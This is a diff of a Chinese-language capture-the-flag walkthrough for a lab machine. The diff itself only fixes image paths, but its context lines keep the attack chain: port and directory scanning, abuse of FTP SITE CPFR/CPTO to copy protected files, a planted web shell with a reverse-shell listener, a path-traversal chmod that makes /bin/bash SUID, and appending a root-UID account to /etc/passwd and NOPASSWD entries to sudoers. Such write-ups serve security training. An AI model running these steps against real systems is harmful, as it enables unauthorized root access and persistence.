@@ -16,7 +16,7 @@
 
 也可以使用`nmap`等工具进行
 
-![](pic-joy\1.jpg)
+![](./pic-joy/1.jpg)
 
 # 信息收集
 
@@ -28,7 +28,7 @@
 nmap -sT 192.168.10.8 --min-rate=1000  -p- -T4 -oA nmap-tcp
 ```
 
-![](pic-joy\2.jpg)
+![](./pic-joy/2.jpg)
 
 扫描常见的20个`udp`端口，不过这里的端口明显处于`open`的很少
 
@@ -36,7 +36,7 @@ nmap -sT 192.168.10.8 --min-rate=1000  -p- -T4 -oA nmap-tcp
 nmap -sU 192.168.10.8 --top-ports 20 -T4 -oA nmap-udp
 ```
 
-![](pic-joy\3.jpg)
+![](./pic-joy/3.jpg)
 
 把前面扫描出的`tcp`端口，进行处理，只取端口号
 
@@ -45,7 +45,7 @@ grep open nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','
 ports=21,22,25,80,110,139,143,445,465,587,993,995
 ```
 
-![](pic-joy\4.jpg)
+![](./pic-joy/4.jpg)
 
 对特定的端口号进行深入探测
 
@@ -53,13 +53,13 @@ ports=21,22,25,80,110,139,143,445,465,587,993,995
 nmap -sV -O -sC -sT 192.168.10.8 -p $ports -oA detail
 ```
 
-![](pic-joy\5.jpg)
+![](./pic-joy/5.jpg)
 
-![6](pic-joy\6.jpg)
+![6](./pic-joy/6.jpg)
 
-![7](pic-joy\7.jpg)
+![7](./pic-joy/7.jpg)
 
-![8](pic-joy\8.jpg)
+![8](./pic-joy/8.jpg)
 
 对特定的端口号进行漏洞检测
 
@@ -67,13 +67,13 @@ nmap -sV -O -sC -sT 192.168.10.8 -p $ports -oA detail
 nmap --script=vuln 192.168.10.8 -p $ports -oA vuln
 ```
 
-![](pic-joy\9.jpg)
+![](./pic-joy/9.jpg)
 
-![10](pic-joy\10.jpg)
+![10](./pic-joy/10.jpg)
 
-![11](pic-joy\11.jpg)
+![11](./pic-joy/11.jpg)
 
-![12](pic-joy\12.jpg)
+![12](./pic-joy/12.jpg)
 
 ## FTP探测
 
@@ -93,13 +93,13 @@ ftp> prompt
 ftp> mget *
 ```
 
-![](pic-joy\13.jpg)
+![](./pic-joy/13.jpg)
 
 查看`directory`文件，发现该文件是`patrick`的目录
 
-![](pic-joy\14.jpg)
+![](./pic-joy/14.jpg)
 
-![15](pic-joy\15.jpg)
+![15](./pic-joy/15.jpg)
 
 这个文档中的信息，有很多，首先就是文件名，怀疑可能是某些密码，保存下来
 
@@ -118,7 +118,7 @@ LztsbkkhKLpxTzx4b4qRBK44hTDqr7cG
 
 继续查看其他文件，发现大部分无用，不过在`project_zoo`文档中，发现多信息，疑似可能有用
 
-![](pic-joy\16.jpg)
+![](./pic-joy/16.jpg)
 
 把这些信息都保存在`words.txt`中
 
@@ -126,7 +126,7 @@ LztsbkkhKLpxTzx4b4qRBK44hTDqr7cG
 
 使用`enum4linux`进行枚举，枚举出的只有两个分享`print$`和`IPC$`，用户枚举出两个，一个`patrick`和`ftp`
 
-![](pic-joy\17.jpg)
+![](./pic-joy/17.jpg)
 
 使用`nmap`的脚本进行测试，发现结果与`enum4linux`差不多
 
@@ -134,7 +134,7 @@ LztsbkkhKLpxTzx4b4qRBK44hTDqr7cG
 nmap --script=smb* 192.168.10.8
 ```
 
-![](pic-joy\18.jpg)
+![](./pic-joy/18.jpg)
 
 
 
@@ -142,11 +142,11 @@ nmap --script=smb* 192.168.10.8
 
 访问80端口的`http`服务，有一个目录`ossec`
 
-![](pic-joy\19.jpg)
+![](./pic-joy/19.jpg)
 
 点击`ossec`，可以看到是某个`cms`
 
-![](pic-joy\20.jpg)
+![](./pic-joy/20.jpg)
 
 使用`gobuster`进行目录爆破
 
@@ -154,13 +154,13 @@ nmap --script=smb* 192.168.10.8
 gobuster dir -u http://192.168.10.8/ossec -w /usr/share/wordlists/dirb/big.txt -x php,bak,txt,js,html -b 403-404
 ```
 
-![](pic-joy\21.jpg)
+![](./pic-joy/21.jpg)
 
 发现`README`，尝试访问，发现具体的`cms`的版本信息，`ossec web ui v0.8`
 
 以及`ossec`的版本处于`>=0.9-3`
 
-![](pic-joy\22.jpg)
+![](./pic-joy/22.jpg)
 
 使用`searchsploit`搜索有无漏洞可利用，不过可以看到并无需要的，两个本地提权，一个拒绝服务
 
@@ -168,7 +168,7 @@ gobuster dir -u http://192.168.10.8/ossec -w /usr/share/wordlists/dirb/big.txt -
 searchsploit ossec
 ```
 
-![](pic-joy\23.jpg)
+![](./pic-joy/23.jpg)
 
 测试网站的`php`文件，也没有测试到隐藏的传参，路径遍历也没有。
 
@@ -188,11 +188,11 @@ searchsploit ossec
 nmap -sV --script=ftp* 192.168.10.8 -p 21
 ```
 
-![](pic-joy\23-1.jpg)
+![](./pic-joy/23-1.jpg)
 
 其他协议该重测的都重测了，这里只有这个在尝试`nc`或`telnet`连接后，输入`help`有提示命令
 
-![](pic-joy\24.jpg)
+![](./pic-joy/24.jpg)
 
 这里就是通过`ftp`协议直接连接与其他方式的不同之处了，ftp连接后相当于直接进入文件管理，而`telnet`连接，其本身就相当于远程登录，所以不一样。
 
@@ -200,7 +200,7 @@ nmap -sV --script=ftp* 192.168.10.8 -p 21
 
 不过对于这些命令，尝试搜索一下功能，发现`site`这个是`用于发送特定于服务器的站点命令，不同服务器对其实现可能不同`，用法可以`site help`
 
-![](pic-joy\25.jpg)
+![](./pic-joy/25.jpg)
 
 再次搜索`CPFR`和`CPTO`及其他子命令，发现有意思
 
@@ -238,7 +238,7 @@ site cpfr /home/patrick/version_control
 site cpto /home/ftp/download/version_control
 ```
 
-![](pic-joy\26.jpg)
+![](./pic-joy/26.jpg)
 
 成功了，啧，那么应该可以修改一些配置文件，比如`ssh`的连接配置，修改后，使得可以指定某些用户可以登录，先查看文件是否有想要的
 
@@ -248,7 +248,7 @@ site cpto /home/ftp/download/version_control
 
 这里给出了网站的根目录，不再是默认的`/var/www/html`
 
-![](pic-joy\27.jpg)
+![](./pic-joy/27.jpg)
 
 这里尝试复制`root`下的文件，没想到可以，这个权限很高啊
 
@@ -284,11 +284,11 @@ site cpto /home/ftp/download/version_control
 
 通过`ftp`连接后上传，然后再通过`telnet`连接21端口，进行复制
 
-![](pic-joy\28.jpg)
+![](./pic-joy/28.jpg)
 
 可以看到有了，说明成功
 
-![](pic-joy\29.jpg)
+![](./pic-joy/29.jpg)
 
 访问`shell.php`后，尝试了`bash、nc`的几种反弹`shell`无效后，使用`php`
 
@@ -304,13 +304,13 @@ nc -lvnp 9999
 
 这时候执行上面的`php`语句即可反弹成功
 
-![](pic-joy\30.jpg)
+![](./pic-joy/30.jpg)
 
 # 靶机内信息收集
 
 查看网站中的目录，啧，真的是有内容，但是字典就是扫不出来啊
 
-![](pic-joy\31.jpg)
+![](./pic-joy/31.jpg)
 
 | 用户名  | 密码                                   |
 | ------- | -------------------------------------- |
@@ -319,7 +319,7 @@ nc -lvnp 9999
 
 测试，`patrick`用户可以切换
 
-![](pic-joy\32.jpg)
+![](./pic-joy/32.jpg)
 
 使用`find`寻找具有SUID权限的文件
 
@@ -327,7 +327,7 @@ nc -lvnp 9999
 find / -perm -4000 -print 2>/dev/null
 ```
 
-![](pic-joy\33.jpg)
+![](./pic-joy/33.jpg)
 
 # 提权
 
@@ -337,21 +337,21 @@ find / -perm -4000 -print 2>/dev/null
 
 使用`sudo -u root 【文件】`执行
 
-![](pic-joy\34.jpg)
+![](./pic-joy/34.jpg)
 
 再次执行，这里就是修改文件的权限的脚本，并且，是把用户的输入进行拼接到当前路径
 
-![](pic-joy\35.jpg)
+![](./pic-joy/35.jpg)
 
 那么使用`../`在拼接时，能否绕过呢，根据前面的提示，这里采用三个`../`
 
 修改权限成功
 
-![](pic-joy\36.jpg)
+![](./pic-joy/36.jpg)
 
 既然如此，我直接把`/bin/bash`加个SUID权限不就可以了
 
-![](pic-joy\37.jpg)
+![](./pic-joy/37.jpg)
 
 这里这个脚本很强大，可以修改权限的，那么就可以随意修改了，这里加SUID权限是最便捷的。
 
@@ -384,7 +384,7 @@ cat:$6$r9KLjdk5AsgDfU/k$4JwtAwJUiLll6epxebGXc5xIySOoO1NvolN5z5RLh6CYxqOXwbNroMbt
 echo 'cat:$6$r9KLjdk5AsgDfU/k$4JwtAwJUiLll6epxebGXc5xIySOoO1NvolN5z5RLh6CYxqOXwbNroMbtpxKXCUlkhuCtRMCyHpklQMOwYMLnJ.:0:0:root:/root:/bin/bash' >> /etc/passwd
 ```
 
-![](pic-joy\38.jpg)
+![](./pic-joy/38.jpg)
 
 
 
@@ -402,7 +402,7 @@ echo "patrick ALL=(ALL:ALL) ALL" >> /etc/sudoers
 
 使用`cpfr、cpto`获取`/etc/passwd`或`/etc/sudoers`文件
 
-![](pic-joy\39.jpg)
+![](./pic-joy/39.jpg)
 
 然后在`kali`中通过`ftp`协议连接靶机，下载到`kali`，然后修改文件内容，再把文件上传到`ftp`服务器中，在两个文件的后面加上下面的语句即可
 
@@ -414,7 +414,7 @@ dog:$6$r9KLjdk5AsgDfU/k$4JwtAwJUiLll6epxebGXc5xIySOoO1NvolN5z5RLh6CYxqOXwbNroMbt
 patrick ALL=(ALL:ALL) NOPASSWD: ALL
 ```
 
-![](pic-joy\40.jpg)
+![](./pic-joy/40.jpg)
 
 然后上传到`ftp`服务器
 
@@ -423,15 +423,15 @@ put passwd
 put sudoers
 ```
 
-![](pic-joy\41.jpg)
+![](./pic-joy/41.jpg)
 
 然后通过`telnet`连接21端口后，进行复制覆盖
 
-![](pic-joy\42.jpg)
+![](./pic-joy/42.jpg)
 
 这时候再通过网站反弹的`shell`去测试即可，这里甚至可以不用到`patrix`，当然这里我省略了，可以自己去测试
 
-![](pic-joy\43.jpg)
+![](./pic-joy/43.jpg)
 
 
 
